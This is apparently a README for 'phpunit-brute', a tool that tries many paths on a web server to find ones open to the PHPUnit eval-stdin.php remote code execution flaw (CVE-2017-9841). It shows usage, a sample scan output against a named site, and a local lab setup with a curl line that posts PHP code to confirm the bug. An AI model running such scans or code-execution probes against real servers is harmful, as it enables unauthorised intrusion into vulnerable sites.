# phpunit-brute

Tool to try multiple paths for PHPunit RCE (CVE-2017-9841).

It uses local payloads list

if you have a path that is not on there please submit a PR

Install
---
```
python3 -m pip install -r requirements.txt
```
usage
---
```
phpunit-brute.py [-h] -u URL [-o OUTPUT] [-p PROXY]
phpunit-brute.py: error: the following arguments are required: -u/--url
```


Example
---

```
python3 phpunit-brute.py -u http://someoldwebsite.com -o results.txt


[-] No Luck for /_inc/vendor/stripe/stripe-php/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [-]
[-] No Luck for /_staff/cron/php/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [-]
[-] No Luck for /_staff/php/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [-]
[-] No Luck for /~champiot/Laravel E2N test/tuto_laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [-]
[-] No Luck for /~champiot/Laravel%20E2N%20test/tuto_laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [-]
[-] No Luck for /~champiot/tuto_laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [-]
[-] No Luck for /172410101040/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [-]
[-] No Luck for /1board/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [-]
[-] No Luck for /20170811125232/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [-]
[+] Found RCE for http://someoldwebsite.com/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [+]
```

Testing the script
---
in case you want to test the script install following
```
sudo apt -y install curl php-cli php-xml php-mbstring git unzip
sudo php composer-setup.php --install-dir=/usr/local/bin --filename=composer
php -r "copy('https://getcomposer.org/installer', 'composer-setup.php');"
php -r "if (hash_file('sha384', 'composer-setup.php') === '756890a4488ce9024fc62c56153228907f1545c228516cbf63f885e036d37e9a59d27d63f46af1d4d07ee0f76181c7d3') { echo 'Installer verified'; } else { echo 'Installer corrupt'; unlink('composer-setup.php'); } echo PHP_EOL;"
php composer-setup.php
php -r "unlink('composer-setup.php');"
composer require phpunit/phpunit:5.6.2
```
run it using
```php -S 127.0.0.1:8888```
and before testing script confirm the bug using curl
```curl --data "<?php echo(pi());"http://localhost:8888/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php```